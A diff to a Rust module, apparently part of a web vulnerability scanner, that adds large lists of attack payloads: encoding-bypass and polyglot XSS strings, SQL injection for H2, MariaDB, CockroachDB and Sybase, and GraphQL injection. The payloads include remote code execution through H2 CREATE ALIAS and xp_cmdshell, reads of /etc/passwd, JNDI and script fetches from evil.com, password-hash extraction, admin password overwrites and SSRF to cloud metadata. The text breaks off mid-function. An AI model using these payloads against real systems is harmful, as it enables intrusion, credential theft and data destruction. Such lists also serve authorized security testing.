@@ -1024,6 +1024,288 @@ pub fn generate_modern_waf_bypass_xss() -> Vec<String> {
     payloads
 }
 
+/// Generate advanced encoding bypass XSS payloads (50+)
+/// Covers hex, octal, Unicode, UTF-7, overlong UTF-8, and mixed encodings for WAF bypass
+pub fn generate_advanced_encoding_bypass_xss() -> Vec<String> {
+    let mut payloads = Vec::new();
+
+    // ===========================================
+    // 1. HEX ENCODING (\xNN format in JavaScript)
+    // ===========================================
+
+    // \x61\x6c\x65\x72\x74 = "alert"
+    payloads.extend(vec![
+        // Basic hex-encoded alert
+        r#"<script>\x61\x6c\x65\x72\x74(1)</script>"#.to_string(),
+        r#"<script>\x61\x6c\x65\x72\x74(document.domain)</script>"#.to_string(),
+        r#"<script>\x61\x6c\x65\x72\x74(document.cookie)</script>"#.to_string(),
+
+        // Hex in event handlers
+        r#"<img src=x onerror=\x61\x6c\x65\x72\x74(1)>"#.to_string(),
+        r#"<svg onload=\x61\x6c\x65\x72\x74(1)>"#.to_string(),
+        r#"<body onload=\x61\x6c\x65\x72\x74(1)>"#.to_string(),
+
+        // Hex-encoded tags and attributes
+        r#"<\x73\x63\x72\x69\x70\x74>alert(1)</script>"#.to_string(), // <script>
+        r#"<script>\x65\x76\x61\x6c('alert(1)')</script>"#.to_string(), // eval
+        r#"<script>\x46\x75\x6e\x63\x74\x69\x6f\x6e('alert(1)')()</script>"#.to_string(), // Function
+
+        // Partial hex encoding (mixed)
+        r#"<script>al\x65rt(1)</script>"#.to_string(),
+        r#"<script>\x61lert(1)</script>"#.to_string(),
+        r#"<img src=x on\x65rror=alert(1)>"#.to_string(),
+    ]);
+
+    // ===========================================
+    // 2. OCTAL ENCODING (\NNN format)
+    // ===========================================
+
+    // \141\154\145\162\164 = "alert"
+    payloads.extend(vec![
+        // Basic octal-encoded alert
+        r#"<script>\141\154\145\162\164(1)</script>"#.to_string(),
+        r#"<script>\141\154\145\162\164(document.domain)</script>"#.to_string(),
+
+        // Octal in event handlers
+        r#"<img src=x onerror=\141\154\145\162\164(1)>"#.to_string(),
+        r#"<svg onload=\141\154\145\162\164(1)>"#.to_string(),
+
+        // javascript: protocol in octal
+        // \152\141\166\141\163\143\162\151\160\164 = "javascript"
+        r#"<a href="\152\141\166\141\163\143\162\151\160\164:alert(1)">click</a>"#.to_string(),
+
+        // Partial SVG tag in octal: \74\163\166\147 = "<svg"
+        r#"javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'"#.to_string(),
+
+        // Mixed octal
+        r#"<script>al\145rt(1)</script>"#.to_string(),
+        r#"<script>\141lert(1)</script>"#.to_string(),
+    ]);
+
+    // ===========================================
+    // 3. UNICODE ESCAPES (\uNNNN format)
+    // ===========================================
+
+    // \u0061\u006c\u0065\u0072\u0074 = "alert"
+    payloads.extend(vec![
+        // Basic Unicode-encoded alert
+        r#"<script>\u0061\u006c\u0065\u0072\u0074(1)</script>"#.to_string(),
+        r#"<script>\u0061\u006c\u0065\u0072\u0074(document.domain)</script>"#.to_string(),
+        r#"<script>\u0061\u006c\u0065\u0072\u0074(document.cookie)</script>"#.to_string(),
+
+        // Unicode in event handlers
+        r#"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>"#.to_string(),
+        r#"<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>"#.to_string(),
+        r#"<body onload=\u0061\u006c\u0065\u0072\u0074(1)>"#.to_string(),
+
+        // Full-width Unicode bypass characters
+        // U+FF1C = < (full-width less-than)
+        // U+FF1E = > (full-width greater-than)
+        "<\u{FF1C}script\u{FF1E}alert(1)</script>".to_string(),
+        "<img src=x onerror=\u{FF1C}alert(1)\u{FF1E}>".to_string(),
+
+        // Unicode eval
+        r#"<script>\u0065\u0076\u0061\u006c('alert(1)')</script>"#.to_string(),
+
+        // Unicode Function constructor
+        r#"<script>\u0046\u0075\u006e\u0063\u0074\u0069\u006f\u006e('alert(1)')()</script>"#.to_string(),
+
+        // Partial Unicode encoding
+        r#"<script>al\u0065rt(1)</script>"#.to_string(),
+        r#"<script>\u0061lert(1)</script>"#.to_string(),
+    ]);
+
+    // ===========================================
+    // 4. UTF-7 ENCODING (+ADw- format for legacy charset attacks)
+    // ===========================================
+
+    // +ADw- = < | +AD4- = > | +ACI- = "
+    payloads.extend(vec![
+        // Basic UTF-7 script tag
+        "+ADw-script+AD4-alert(1)+ADw-/script+AD4-".to_string(),
+        "+ADw-script+AD4-alert(document.domain)+ADw-/script+AD4-".to_string(),
+        "+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-".to_string(),
+
+        // UTF-7 img tag with event handler
+        "+ADw-img src+AD0-+ACI-1+ACI- onerror+AD0-+ACI-alert(1)+ACI- /+AD4-".to_string(),
+        "+ADw-img src+AD0-x onerror+AD0-alert(1)+AD4-".to_string(),
+
+        // UTF-7 SVG
+        "+ADw-svg onload+AD0-alert(1)+AD4-".to_string(),
+        "+ADw-svg/onload+AD0-alert(1)+AD4-".to_string(),
+
+        // UTF-7 body tag
+        "+ADw-body onload+AD0-alert(1)+AD4-".to_string(),
+
+        // UTF-7 with charset header injection
+        "+ADw-meta http-equiv+AD0-+ACI-Content-Type+ACI- content+AD0-+ACI-text/html+ADs- charset+AD0-UTF-7+ACI-+AD4-+ADw-script+AD4-alert(1)+ADw-/script+AD4-".to_string(),
+    ]);
+
+    // ===========================================
+    // 5. UTF-8 OVERLONG SEQUENCES (WAF bypass)
+    // ===========================================
+
+    // These exploit UTF-8 encoding allowing multiple representations
+    // < (U+003C) can be encoded as:
+    // - 2-byte overlong: C0 BC
+    // - 3-byte overlong: E0 80 BC
+    // - 4-byte overlong: F0 80 80 BC
+    payloads.extend(vec![
+        // 2-byte overlong < (%C0%BC)
+        "<%C0%BCscript>alert(1)</script>".to_string(),
+        "<%C0%BCimg src=x onerror=alert(1)>".to_string(),
+        "<%C0%BCsvg onload=alert(1)>".to_string(),
+
+        // 3-byte overlong < (%E0%80%BC)
+        "<%E0%80%BCscript>alert(1)</script>".to_string(),
+        "<%E0%80%BCimg src=x onerror=alert(1)>".to_string(),
+        "<%E0%80%BCsvg onload=alert(1)>".to_string(),
+
+        // 4-byte overlong < (%F0%80%80%BC)
+        "<%F0%80%80%BCscript>alert(1)</script>".to_string(),
+        "<%F0%80%80%BCimg src=x onerror=alert(1)>".to_string(),
+
+        // Mixed overlong sequences
+        "<%C0%BCscript%C0%BEalert(1)<%C0%BC/script%C0%BE".to_string(),
+        "<%E0%80%BCscript%E0%80%BEalert(1)<%E0%80%BC/script%E0%80%BE".to_string(),
+    ]);
+
+    // ===========================================
+    // 6. MIXED/NESTED ENCODINGS
+    // ===========================================
+
+    payloads.extend(vec![
+        // String.fromCharCode (97,108,101,114,116 = "alert")
+        "eval(String.fromCharCode(97,108,101,114,116,40,49,41))".to_string(),
+        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>".to_string(),
+        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>".to_string(),
+
+        // Double URL encoding
+        "%253Cscript%253Ealert(1)%253C/script%253E".to_string(),
+        "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E".to_string(),
+        "%253Csvg%2520onload%253Dalert(1)%253E".to_string(),
+
+        // Triple URL encoding
+        "%25253Cscript%25253Ealert(1)%25253C/script%25253E".to_string(),
+
+        // Mixed hex + HTML entity
+        r#"<script>\x61lert&#40;1&#41;</script>"#.to_string(),
+
+        // Mixed Unicode + HTML entity
+        r#"<script>\u0061lert&#40;1&#41;</script>"#.to_string(),
+
+        // Base64 in data URI
+        "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">click</a>".to_string(),
+        "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">".to_string(),
+
+        // atob (base64 decode in JS)
+        "<script>eval(atob('YWxlcnQoMSk='))</script>".to_string(),
+        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>".to_string(),
+
+        // decodeURIComponent
+        "<script>eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))</script>".to_string(),
+
+        // Combined String.fromCharCode with hex
+        r#"<script>eval(String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](97,108,101,114,116,40,49,41))</script>"#.to_string(),
+
+        // Unicode escapes in property access
+        r#"<script>window['\u0061\u006c\u0065\u0072\u0074'](1)</script>"#.to_string(),
+        r#"<script>this['\u0061\u006c\u0065\u0072\u0074'](1)</script>"#.to_string(),
+        r#"<script>self['\u0061\u006c\u0065\u0072\u0074'](1)</script>"#.to_string(),
+
+        // Hex escapes in property access
+        r#"<script>window['\x61\x6c\x65\x72\x74'](1)</script>"#.to_string(),
+        r#"<script>this['\x61\x6c\x65\x72\x74'](1)</script>"#.to_string(),
+
+        // JSFuck-style encoding (partial)
+        "<script>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]</script>".to_string(),
+    ]);
+
+    payloads
+}
+
+/// Generate advanced polyglot XSS payloads (15+)
+/// Polyglots work across multiple contexts: HTML body, attribute, JS string, URL, template literals
+pub fn generate_advanced_polyglot_xss() -> Vec<String> {
+    vec![
+        // ===========================================
+        // 1. 0xsobky Ultimate Polyglot (JS, HTML event, SVG, URL)
+        // Works in: script context, event handler, SVG, data URI
+        // ===========================================
+        r#"jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"#.to_string(),
+
+        // ===========================================
+        // 2. Mathias Karlsson Polyglot (attribute/event/comment)
+        // Breaks out of: attributes, event handlers, HTML comments
+        // ===========================================
+        r#"'-alert(1)-'"#.to_string(),
+        r#"'-alert(1)//'"#.to_string(),
+        r#"-->'"/><img src=x onerror=alert(1)//>"#.to_string(),
+
+        // ===========================================
+        // 3. Multi-context string polyglot (single/double quote JS strings)
+        // Works in both single and double quoted strings
+        // ===========================================
+        r#"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"'>><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"#.to_string(),
+
+        // ===========================================
+        // 4. HTML/JS/URL polyglot
+        // Works in: HTML context, JS context, URL context
+        // ===========================================
+        r#"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"#.to_string(),
+        r#"javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//"#.to_string(),
+
+        // ===========================================
+        // 5. Comment breakout polyglot
+        // Breaks out of: HTML comments, JS comments, CSS comments
+        // ===========================================
+        r#"--!><svg/onload=alert()>"#.to_string(),
+        r#"*/alert(1)/*"#.to_string(),
+        r#"*/</script><script>alert(1)</script>/*"#.to_string(),
+        r#"--></script><script>alert(1)</script><!--"#.to_string(),
+
+        // ===========================================
+        // 6. Template literal polyglot (ES6)
+        // Works with backtick template strings
+        // ===========================================
+        r#"${alert(1)}"#.to_string(),
+        r#"`-alert(1)-`"#.to_string(),
+        r#"${`${alert(1)}`}"#.to_string(),
+        r#"</script><script>`${alert(1)}`</script>"#.to_string(),
+
+        // ===========================================
+        // 7. Mutation XSS polyglot
+        // Exploits browser HTML parsing quirks
+        // ===========================================
+        r#"<noscript><p title="</noscript><img src=x onerror=alert(1)>">"#.to_string(),
+        r#"<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>"#.to_string(),
+        r#"<svg><style>{font-family:'<img/src=x onerror=alert(1)>'}"#.to_string(),
+
+        // ===========================================
+        // 8. Universal context-breaker polyglot
+        // Breaks out of most common contexts
+        // ===========================================
+        r#"</title></style></textarea></noscript></template></script><img src=x onerror=alert(1)>"#.to_string(),
+        r#"'">--></style></script><script>alert(1)</script>"#.to_string(),
+
+        // ===========================================
+        // 9. Attribute value injection polyglot
+        // Works in: href, src, data, action attributes
+        // ===========================================
+        r#"javascript:alert(1)//http://example.com"#.to_string(),
+        r#"data:text/html,<script>alert(1)</script>"#.to_string(),
+
+        // ===========================================
+        // 10. Framework-specific polyglots
+        // Angular, React, Vue template injection
+        // ===========================================
+        r#"{{constructor.constructor('alert(1)')()}}"#.to_string(),  // Angular
+        r#"{{$on.constructor('alert(1)')()}}"#.to_string(),           // Angular
+        r#"[constructor.constructor('alert(1)')()]"#.to_string(),     // Vue
+        r#"<img src=x ng-on-error=alert(1)>"#.to_string(),           // AngularJS
+    ]
+}
+
 /// Get all XSS payloads (110,000+ total)
 pub fn get_all_xss_payloads() -> Vec<String> {
     let mut all_payloads = Vec::new();
@@ -1040,6 +1322,8 @@ pub fn get_all_xss_payloads() -> Vec<String> {
     all_payloads.extend(generate_context_aware_xss()); // 300+
     all_payloads.extend(generate_modern_waf_bypass_xss()); // 200+
     all_payloads.extend(generate_modern_xss_2024_2025()); // 10,000+
+    all_payloads.extend(generate_advanced_encoding_bypass_xss()); // 50+ encoding bypass (hex, octal, Unicode, UTF-7)
+    all_payloads.extend(generate_advanced_polyglot_xss()); // 22+ advanced polyglots (multi-context)
 
     all_payloads
 }
@@ -1302,6 +1586,255 @@ pub fn generate_oracle_specific_sqli() -> Vec<String> {
     payloads
 }
 
+/// H2 Database specific SQLi payloads (15+ payloads)
+/// Targets: H2 embedded database (Java), CREATE ALIAS RCE, CSVREAD file read, LINK_SCHEMA JNDI
+pub fn generate_h2_specific_sqli() -> Vec<String> {
+    let mut payloads = Vec::new();
+
+    // H2 version detection
+    payloads.extend(vec![
+        "' UNION SELECT NULL,H2VERSION()--".to_string(),
+        "' UNION SELECT NULL,DATABASE()--".to_string(),
+        "' AND 1=(SELECT H2VERSION())--".to_string(),
+    ]);
+
+    // H2 CREATE ALIAS Remote Code Execution
+    payloads.extend(vec![
+        "'; CREATE ALIAS EXEC AS 'void exec(String cmd) throws java.io.IOException{Runtime.getRuntime().exec(cmd);}'--".to_string(),
+        "'; CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws Exception{Runtime rt=Runtime.getRuntime();Process p=rt.exec(cmd);return new java.util.Scanner(p.getInputStream()).useDelimiter(\"\\\\A\").next();}$$--".to_string(),
+        "'; CREATE ALIAS IF NOT EXISTS EXEC AS 'void exec(String c)throws Exception{Runtime.getRuntime().exec(c);}'--".to_string(),
+        "'; CALL EXEC('whoami')--".to_string(),
+    ]);
+
+    // H2 CSVREAD file read exploitation
+    payloads.extend(vec![
+        "' UNION SELECT * FROM CSVREAD('file:///etc/passwd')--".to_string(),
+        "' UNION SELECT * FROM CSVREAD('/etc/passwd')--".to_string(),
+        "' UNION SELECT NULL,C1 FROM CSVREAD('file:///etc/passwd')--".to_string(),
+        "' UNION SELECT * FROM CSVREAD('C:\\Windows\\win.ini')--".to_string(),
+    ]);
+
+    // H2 LINK_SCHEMA JNDI injection (CVE-2021-42392 style)
+    payloads.extend(vec![
+        "'; CREATE TABLE test AS SELECT * FROM LINK_SCHEMA('attackerdb','org.h2.Driver','jdbc:h2:mem:','sa','')--".to_string(),
+        "'; CREATE LINKED TABLE link(ID INT) DRIVER 'javax.naming.InitialContext' URL 'ldap://evil.com/a'--".to_string(),
+        "'; RUNSCRIPT FROM 'http://evil.com/exploit.sql'--".to_string(),
+    ]);
+
+    // H2 error-based extraction
+    payloads.extend(vec![
+        "' AND 1=CAST(USER() AS INT)--".to_string(),
+        "' AND 1=CONVERT(DATABASE(),INT)--".to_string(),
+    ]);
+
+    // H2 time-based blind
+    payloads.extend(vec![
+        "'; CALL SLEEP(5)--".to_string(),
+        "' AND 1=(SELECT SLEEP(5))--".to_string(),
+    ]);
+
+    // H2 system information
+    payloads.extend(vec![
+        "' UNION SELECT NULL,SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA--".to_string(),
+        "' UNION SELECT NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--".to_string(),
+        "' UNION SELECT NULL,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS--".to_string(),
+    ]);
+
+    payloads
+}
+
+/// MariaDB specific SQLi payloads (20+ payloads)
+/// Targets: MariaDB-specific functions, CONNECT engine, version detection, system tables
+pub fn generate_mariadb_specific_sqli() -> Vec<String> {
+    let mut payloads = Vec::new();
+
+    // MariaDB version detection (distinguishing from MySQL)
+    payloads.extend(vec![
+        "' UNION SELECT NULL,@@version--".to_string(),
+        "' UNION SELECT NULL,VERSION()--".to_string(),
+        "' AND VERSION() LIKE '%MariaDB%'--".to_string(),
+        "' AND @@version_comment LIKE '%mariadb%'--".to_string(),
+        "' UNION SELECT NULL,@@version_comment--".to_string(),
+    ]);
+
+    // MariaDB-specific functions
+    payloads.extend(vec![
+        "' UNION SELECT NULL,COLUMN_JSON((SELECT * FROM information_schema.tables LIMIT 1))--".to_string(),
+        "' UNION SELECT NULL,JSON_DETAILED((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables))--".to_string(),
+        "' UNION SELECT NULL,JSON_QUERY('{}','$')--".to_string(),
+        "' AND JSON_VALID('{}')--".to_string(),
+    ]);
+
+    // MariaDB CONNECT storage engine exploitation
+    payloads.extend(vec![
+        "'; CREATE TABLE exploit ENGINE=CONNECT TABLE_TYPE=DOS FILE_NAME='/etc/passwd'--".to_string(),
+        "'; CREATE TABLE remote ENGINE=CONNECT TABLE_TYPE=MYSQL SRCDEF='SELECT * FROM mysql.user' HOST='localhost'--".to_string(),
+        "'; CREATE TABLE csvfile ENGINE=CONNECT TABLE_TYPE=CSV FILE_NAME='/var/log/auth.log'--".to_string(),
+        "'; CREATE TABLE xml_data ENGINE=CONNECT TABLE_TYPE=XML FILE_NAME='http://evil.com/xxe.xml'--".to_string(),
+    ]);
+
+    // MariaDB version-conditional execution
+    payloads.extend(vec![
+        "' /*!50503UNION*//*!50503SELECT*/NULL,user()--".to_string(),
+        "' /*!100000AND*/1=1--".to_string(),
+        "' /*!100508UNION SELECT*/NULL,@@version--".to_string(),
+    ]);
+
+    // MariaDB system tables and information
+    payloads.extend(vec![
+        "' UNION SELECT NULL,Host FROM mysql.user--".to_string(),
+        "' UNION SELECT NULL,authentication_string FROM mysql.user--".to_string(),
+        "' UNION SELECT NULL,plugin FROM mysql.user WHERE user='root'--".to_string(),
+        "' UNION SELECT NULL,variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv'--".to_string(),
+    ]);
+
+    // MariaDB time-based blind
+    payloads.extend(vec![
+        "' AND SLEEP(5)--".to_string(),
+        "' AND BENCHMARK(10000000,SHA1('test'))--".to_string(),
+        "' AND (SELECT * FROM (SELECT SLEEP(5))a)--".to_string(),
+    ]);
+
+    // MariaDB error-based
+    payloads.extend(vec![
+        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--".to_string(),
+        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--".to_string(),
+        "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)--".to_string(),
+    ]);
+
+    // MariaDB stored procedure injection
+    payloads.extend(vec![
+        "'; CALL mysql.rds_kill(1)--".to_string(),
+        "'; SET @q='SELECT * FROM users'; PREPARE stmt FROM @q; EXECUTE stmt--".to_string(),
+    ]);
+
+    payloads
+}
+
+/// CockroachDB specific SQLi payloads (15+ payloads)
+/// Targets: CockroachDB crdb_internal tables, PostgreSQL-compatible, EXPLAIN, version detection
+pub fn generate_cockroachdb_specific_sqli() -> Vec<String> {
+    let mut payloads = Vec::new();
+
+    // CockroachDB version detection
+    payloads.extend(vec![
+        "' UNION SELECT NULL,version()--".to_string(),
+        "' UNION SELECT NULL,crdb_internal.node_build_info()--".to_string(),
+        "' AND version() LIKE '%CockroachDB%'--".to_string(),
+        "' UNION SELECT NULL,current_setting('server_version')--".to_string(),
+    ]);
+
+    // CockroachDB crdb_internal system tables
+    payloads.extend(vec![
+        "' UNION SELECT NULL,node_id FROM crdb_internal.gossip_nodes--".to_string(),
+        "' UNION SELECT NULL,store_id FROM crdb_internal.kv_store_status--".to_string(),
+        "' UNION SELECT NULL,database_name FROM crdb_internal.databases--".to_string(),
+        "' UNION SELECT NULL,table_name FROM crdb_internal.tables--".to_string(),
+        "' UNION SELECT NULL,descriptor FROM crdb_internal.table_columns--".to_string(),
+        "' UNION SELECT NULL,address FROM crdb_internal.gossip_liveness--".to_string(),
+    ]);
+
+    // CockroachDB-specific functions
+    payloads.extend(vec![
+        "' UNION SELECT NULL,crdb_internal.cluster_id()--".to_string(),
+        "' UNION SELECT NULL,crdb_internal.node_id()--".to_string(),
+        "' UNION SELECT NULL,crdb_internal.pretty_key(b'\\x00',0)--".to_string(),
+    ]);
+
+    // CockroachDB EXPLAIN information disclosure
+    payloads.extend(vec![
+        "'; EXPLAIN SELECT * FROM users--".to_string(),
+        "'; EXPLAIN ANALYZE SELECT * FROM sensitive_data--".to_string(),
+        "'; SHOW COLUMNS FROM users--".to_string(),
+        "'; SHOW CREATE TABLE users--".to_string(),
+    ]);
+
+    // CockroachDB PostgreSQL-compatible injection (CockroachDB is PG-wire compatible)
+    payloads.extend(vec![
+        "' UNION SELECT NULL,usename FROM pg_user--".to_string(),
+        "' UNION SELECT NULL,datname FROM pg_database--".to_string(),
+        "' AND pg_sleep(5)--".to_string(),
+        "' UNION SELECT NULL,current_user()--".to_string(),
+    ]);
+
+    // CockroachDB error-based extraction
+    payloads.extend(vec![
+        "' AND 1=CAST(version() AS INT)--".to_string(),
+        "' AND 1=CAST(current_user() AS INT)--".to_string(),
+    ]);
+
+    payloads
+}
+
+/// Sybase specific SQLi payloads (20+ payloads)
+/// Targets: Sybase ASE system tables, xp_cmdshell, WAITFOR, error-based extraction
+pub fn generate_sybase_specific_sqli() -> Vec<String> {
+    let mut payloads = Vec::new();
+
+    // Sybase version detection
+    payloads.extend(vec![
+        "' UNION SELECT NULL,@@version--".to_string(),
+        "' UNION SELECT NULL,@@servername--".to_string(),
+        "' AND @@version LIKE '%Sybase%'--".to_string(),
+        "' UNION SELECT NULL,@@language--".to_string(),
+    ]);
+
+    // Sybase system tables (master database)
+    payloads.extend(vec![
+        "' UNION SELECT NULL,name FROM master..sysdatabases--".to_string(),
+        "' UNION SELECT NULL,name FROM master..sysobjects WHERE type='U'--".to_string(),
+        "' UNION SELECT NULL,name FROM master..syscolumns--".to_string(),
+        "' UNION SELECT NULL,name FROM master..syslogins--".to_string(),
+        "' UNION SELECT NULL,password FROM master..syslogins--".to_string(),
+    ]);
+
+    // Sybase command execution (xp_cmdshell)
+    payloads.extend(vec![
+        "'; EXEC master..xp_cmdshell 'whoami'--".to_string(),
+        "'; EXEC xp_cmdshell 'dir c:\\'--".to_string(),
+        "'; EXEC master..xp_cmdshell 'net user'--".to_string(),
+        "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--".to_string(),
+    ]);
+
+    // Sybase WAITFOR time-based blind
+    payloads.extend(vec![
+        "'; WAITFOR DELAY '0:0:5'--".to_string(),
+        "' AND 1=1 WAITFOR DELAY '0:0:5'--".to_string(),
+        "'; IF (1=1) WAITFOR DELAY '0:0:5'--".to_string(),
+        "'; IF (SELECT COUNT(*) FROM master..syslogins)>0 WAITFOR DELAY '0:0:5'--".to_string(),
+    ]);
+
+    // Sybase error-based extraction
+    payloads.extend(vec![
+        "' AND 1=CONVERT(INT,@@version)--".to_string(),
+        "' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM master..sysdatabases))--".to_string(),
+        "' AND 1=CONVERT(INT,USER_NAME())--".to_string(),
+        "' AND 1=CONVERT(INT,DB_NAME())--".to_string(),
+    ]);
+
+    // Sybase login extraction
+    payloads.extend(vec![
+        "' UNION SELECT NULL,suid FROM master..syslogins--".to_string(),
+        "' UNION SELECT NULL,dbname FROM master..syslogins--".to_string(),
+        "' UNION SELECT NULL,accdate FROM master..syslogins--".to_string(),
+    ]);
+
+    // Sybase stacked queries
+    payloads.extend(vec![
+        "'; SELECT * FROM master..sysdatabases--".to_string(),
+        "'; INSERT INTO log_table VALUES(@@version)--".to_string(),
+        "'; UPDATE users SET password='hacked' WHERE username='admin'--".to_string(),
+    ]);
+
+    // Sybase file operations
+    payloads.extend(vec![
+        "'; BULK INSERT temp FROM 'c:\\boot.ini'--".to_string(),
+        "'; SELECT * INTO temp FROM OPENROWSET('SQLOLEDB','server';'sa';'','SELECT * FROM remote..users')--".to_string(),
+    ]);
+
+    payloads
+}
+
 /// Get all SQLi payloads (75,000+ total)
 pub fn get_all_sqli_payloads() -> Vec<String> {
     let mut all_payloads = Vec::new();
@@ -1315,6 +1848,10 @@ pub fn get_all_sqli_payloads() -> Vec<String> {
     all_payloads.extend(generate_postgresql_specific_sqli()); // 300+
     all_payloads.extend(generate_mssql_specific_sqli()); // 300+
     all_payloads.extend(generate_oracle_specific_sqli()); // 300+
+    all_payloads.extend(generate_h2_specific_sqli()); // 21+
+    all_payloads.extend(generate_mariadb_specific_sqli()); // 28+
+    all_payloads.extend(generate_cockroachdb_specific_sqli()); // 23+
+    all_payloads.extend(generate_sybase_specific_sqli()); // 29+
     all_payloads.extend(generate_modern_sqli_2024_2025()); // 5,000+
 
     all_payloads
@@ -2155,6 +2692,87 @@ pub fn generate_crlf_payloads() -> Vec<String> {
     ]
 }
 
+/// GraphQL injection payloads (25+ payloads)
+/// Targets: Introspection queries, batching attacks, nested queries, SQL/NoSQL through args
+pub fn generate_graphql_injection_payloads() -> Vec<String> {
+    let mut payloads = Vec::new();
+
+    // GraphQL introspection queries (information disclosure)
+    payloads.extend(vec![
+        r#"{"query":"query{__schema{types{name fields{name}}}}"}"#.to_string(),
+        r#"{"query":"query{__schema{queryType{name}mutationType{name}subscriptionType{name}}}"}"#.to_string(),
+        r#"{"query":"query{__type(name:\"User\"){name fields{name type{name}}}}"}"#.to_string(),
+        r#"{"query":"{__schema{directives{name args{name}}}}"}"#.to_string(),
+        r#"{"query":"query IntrospectionQuery{__schema{queryType{name}types{...FullType}}}fragment FullType on __Type{name fields{name}}"}"#.to_string(),
+    ]);
+
+    // GraphQL batching attacks (DoS, rate limit bypass)
+    payloads.extend(vec![
+        r#"[{"query":"query{user(id:1){name}}"},{"query":"query{user(id:2){name}}"},{"query":"query{user(id:3){name}}"}]"#.to_string(),
+        r#"[{"query":"mutation{login(user:\"a\",pass:\"1\")}"},{"query":"mutation{login(user:\"a\",pass:\"2\")}"},{"query":"mutation{login(user:\"a\",pass:\"3\")}"}]"#.to_string(),
+        r#"{"query":"query{u1:user(id:1){name}u2:user(id:2){name}u3:user(id:3){name}}"}"#.to_string(),
+    ]);
+
+    // GraphQL deeply nested queries (DoS)
+    payloads.extend(vec![
+        r#"{"query":"query{user{friends{friends{friends{friends{friends{name}}}}}}}"}"#.to_string(),
+        r#"{"query":"query{a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{q}}}}}}}}}}}}}}}}}"}"#.to_string(),
+        r#"{"query":"query{user{posts{comments{author{posts{comments{author{name}}}}}}}}"}"#.to_string(),
+    ]);
+
+    // SQL injection through GraphQL arguments
+    payloads.extend(vec![
+        r#"{"query":"query{user(id:\"1' OR '1'='1\"){name}}"}"#.to_string(),
+        r#"{"query":"query{users(filter:\"1; DROP TABLE users--\"){name}}"}"#.to_string(),
+        r#"{"query":"mutation{createUser(name:\"test\",email:\"' OR 1=1--\"){id}}"}"#.to_string(),
+        r#"{"query":"query{search(q:\"test' UNION SELECT password FROM users--\"){results}}"}"#.to_string(),
+    ]);
+
+    // NoSQL injection through GraphQL arguments
+    payloads.extend(vec![
+        r#"{"query":"query{user(id:{\"$gt\":\"\"}){name}}"}"#.to_string(),
+        r#"{"query":"query{users(filter:{\"$where\":\"this.password.length>0\"}){name}}"}"#.to_string(),
+        r#"{"query":"mutation{login(user:\"admin\",pass:{\"$ne\":\"x\"})}"}"#.to_string(),
+        r#"{"query":"query{user(id:{\"$regex\":\".*\"}){name email password}}"}"#.to_string(),
+    ]);
+
+    // GraphQL field/directive overloading
+    payloads.extend(vec![
+        r#"{"query":"query{user(id:1){name @include(if:true) name @skip(if:false)}}"}"#.to_string(),
+        r#"{"query":"query{__typename @deprecated}"}"#.to_string(),
+        r#"{"query":"query{user{...on User{name}...on Admin{secretKey}}}"}"#.to_string(),
+    ]);
+
+    // GraphQL authorization bypass attempts
+    payloads.extend(vec![
+        r#"{"query":"query{user(id:1){id name email password secretToken}}"}"#.to_string(),
+        r#"{"query":"mutation{deleteUser(id:1)}"}"#.to_string(),
+        r#"{"query":"mutation{updateUser(id:1,role:\"admin\"){role}}"}"#.to_string(),
+        r#"{"query":"query{adminPanel{users{password}}}"}"#.to_string(),
+    ]);
+
+    // GraphQL SSRF through arguments
+    payloads.extend(vec![
+        r#"{"query":"mutation{importData(url:\"http://169.254.169.254/latest/meta-data/\")}"}"#.to_string(),
+        r#"{"query":"query{fetch(url:\"file:///etc/passwd\")}"}"#.to_string(),
+        r#"{"query":"mutation{webhook(url:\"http://localhost:8080/admin\")}"}"#.to_string(),
+    ]);
+
+    // GraphQL variables injection
+    payloads.extend(vec![
+        r#"{"query":"query($id:ID!){user(id:$id){name}}","variables":{"id":"1' OR '1'='1"}}"#.to_string(),
+        r#"{"query":"query($filter:String){users(filter:$filter){name}}","variables":{"filter":"{\"$gt\":\"\"}"}}"#.to_string(),
+    ]);
+
+    // GraphQL fragment injection
+    payloads.extend(vec![
